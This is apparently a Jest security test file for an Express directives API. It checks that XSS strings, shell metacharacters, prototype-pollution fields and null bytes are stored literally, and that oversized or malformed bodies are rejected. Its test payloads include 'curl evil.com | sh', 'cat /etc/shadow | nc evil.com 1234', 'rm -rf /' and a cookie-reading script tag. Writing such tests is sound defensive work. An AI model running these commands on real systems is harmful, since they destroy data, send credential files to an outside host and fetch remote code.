/**
 * @jest-environment node
 *
 * Security tests for the directives API:
 *   - XSS: <script> tags in directive text stored literally
 *   - Shell metacharacters stored literally, not interpreted
 *   - Oversized bodies (>10KB) rejected
 *   - Malformed JSON returns 400
 *   - Text exceeding 2000 chars rejected
 */

import request from "supertest";
import express, { Request, Response, NextFunction } from "express";
import fs from "fs";
import path from "path";
import os from "os";

const TEST_TOKEN = "test-bearer-token";

function buildApp(directivesFile: string) {
  const app = express();
  // Design spec: 10KB body limit for security
  app.use(express.json({ limit: "10kb" }));

  app.use("/api", (req: Request, res: Response, next: NextFunction) => {
    const hToken = (req.headers.authorization ?? "").replace(
      /^Bearer\s+/i,
      ""
    );
    if (hToken === TEST_TOKEN) return next();
    res.status(401).json({ error: "Unauthorized" });
  });

  // eslint-disable-next-line @typescript-eslint/no-var-requires
  const { createDirectivesRouter } = require("../../dashboard/directives");
  app.use("/api", createDirectivesRouter(directivesFile));

  return app;
}

describe("Directives Security", () => {
  let tmpDir: string;
  let directivesFile: string;
  let app: ReturnType<typeof buildApp>;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "directives-sec-"));
    directivesFile = path.join(tmpDir, "directives.json");
    app = buildApp(directivesFile);
    jest.resetModules();
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // ── XSS: script tags stored literally ──────────────────────────────────

  it("stores <script> tags in directive text as literal strings", async () => {
    const xssPayload = '<script>alert("xss")</script>';
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: xssPayload, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    // Text must be stored exactly as received (trimmed), not stripped or encoded
    expect(res.body.text).toBe(xssPayload);

    // Verify it's stored literally in the file too
    const stored = JSON.parse(fs.readFileSync(directivesFile, "utf-8"));
    expect(stored[0].text).toBe(xssPayload);
  });

  it("stores HTML entities in directive text literally", async () => {
    const htmlPayload = '<img src=x onerror="alert(1)">';
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: htmlPayload, type: "policy", priority: "urgent" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(htmlPayload);
  });

  // ── Shell metacharacters stored literally ──────────────────────────────

  it("stores shell semicolons and rm commands literally", async () => {
    const shellPayload = "; rm -rf / --no-preserve-root";
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: shellPayload, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(shellPayload);
  });

  it("stores $() command substitution literally", async () => {
    const shellPayload = "$(cat /etc/passwd)";
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: shellPayload, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(shellPayload);
  });

  it("stores backtick command substitution literally", async () => {
    const shellPayload = "`whoami`";
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: shellPayload, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(shellPayload);
  });

  it("stores && chained commands literally", async () => {
    const shellPayload = "echo hi && curl evil.com | sh";
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: shellPayload, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(shellPayload);
  });

  it("stores pipe characters literally", async () => {
    const shellPayload = "cat /etc/shadow | nc evil.com 1234";
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: shellPayload, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(shellPayload);
  });

  // ── Oversized body rejection ───────────────────────────────────────────

  it("rejects bodies larger than 10KB with 413", async () => {
    const bigText = "x".repeat(12_000);
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: bigText, type: "task", priority: "normal" });

    expect(res.status).toBe(413);
  });

  // ── Text length enforcement ────────────────────────────────────────────

  it("rejects directive text exceeding 2000 characters", async () => {
    const longText = "a".repeat(2001);
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: longText, type: "task", priority: "normal" });

    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/text/i);
  });

  it("accepts directive text at exactly 2000 characters", async () => {
    const maxText = "b".repeat(2000);
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: maxText, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(maxText);
  });

  // ── Malformed JSON ─────────────────────────────────────────────────────

  it("returns 400 for malformed JSON body", async () => {
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .set("Content-Type", "application/json")
      .send("{invalid json!!!");

    expect(res.status).toBe(400);
  });

  it("returns 400 for completely empty body", async () => {
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .set("Content-Type", "application/json")
      .send("");

    // Express json parser returns 400 for empty body with content-type json
    expect(res.status).toBe(400);
  });

  // ── PATCH: XSS via agent_notes ───────────────────────────────────────────

  it("stores <script> tags in agent_notes literally via PATCH", async () => {
    const created = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: "Test directive", type: "task", priority: "normal" });

    const id = created.body.id;
    const xssPayload = '<script>document.cookie</script>';

    const res = await request(app)
      .patch(`/api/directives/${id}`)
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ agent_notes: xssPayload });

    expect(res.status).toBe(200);
    expect(res.body.agent_notes).toBe(xssPayload);

    // Verify stored literally on disk
    const stored = JSON.parse(fs.readFileSync(directivesFile, "utf-8"));
    expect(stored[0].agent_notes).toBe(xssPayload);
  });

  it("stores shell metacharacters in agent_notes literally via PATCH", async () => {
    const created = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: "Test", type: "policy", priority: "normal" });

    const id = created.body.id;
    const shellPayload = "$(rm -rf /) && `whoami` | nc evil.com 1234";

    const res = await request(app)
      .patch(`/api/directives/${id}`)
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ agent_notes: shellPayload });

    expect(res.status).toBe(200);
    expect(res.body.agent_notes).toBe(shellPayload);
  });

  // ── Prototype pollution ──────────────────────────────────────────────────

  it("ignores __proto__ fields in request body (no prototype pollution)", async () => {
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({
        text: "Normal directive",
        type: "task",
        priority: "normal",
        __proto__: { admin: true, isAdmin: true },
      });

    expect(res.status).toBe(201);
    // The directive should be created normally
    expect(res.body.text).toBe("Normal directive");
    // __proto__ fields should not leak into the response
    expect(res.body.admin).toBeUndefined();
    expect(res.body.isAdmin).toBeUndefined();
  });

  // ── Null bytes ───────────────────────────────────────────────────────────

  it("stores null bytes in directive text without corruption", async () => {
    const nullPayload = "before\x00after";
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .send({ text: nullPayload, type: "task", priority: "normal" });

    expect(res.status).toBe(201);
    expect(res.body.text).toBe(nullPayload);
  });

  // ── Content-Type enforcement ─────────────────────────────────────────────

  it("rejects non-JSON content type with appropriate error", async () => {
    const res = await request(app)
      .post("/api/directives")
      .set("Authorization", `Bearer ${TEST_TOKEN}`)
      .set("Content-Type", "text/plain")
      .send("this is not json");

    // Express json() middleware ignores non-JSON content types → body is empty → 400
    expect(res.status).toBe(400);
  });
});
